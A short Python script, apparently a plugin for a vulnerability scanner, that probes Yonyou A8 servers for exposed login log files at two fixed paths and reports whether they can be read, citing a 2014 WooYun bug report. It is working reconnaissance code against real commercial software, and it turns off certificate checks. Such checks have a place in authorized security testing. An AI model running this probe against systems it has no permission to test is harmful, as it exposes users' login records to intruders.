#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友a8 log泄露
referer: http://wooyun.tangscan.cn/static/bugs/wooyun-2014-081757.html
author: Lucifer
description: 用友a8 logs目录中多个log文件可访问。
'''
import sys
import re
import requests
import warnings
def run(url):
        result = ['用友a8 log泄露','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payloads = ["/logs/login.log", 
                    "/seeyon/logs/login.log"]
        try:
            for payload in payloads:
                vulnurl = url + payload
                req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                pattern = re.search("[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}:[0-9]{2}:[0-9]{2}", req.text)
                if pattern:
                    result[2]=  '存在'
                    result[1] = vulnurl
                else:
                    result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
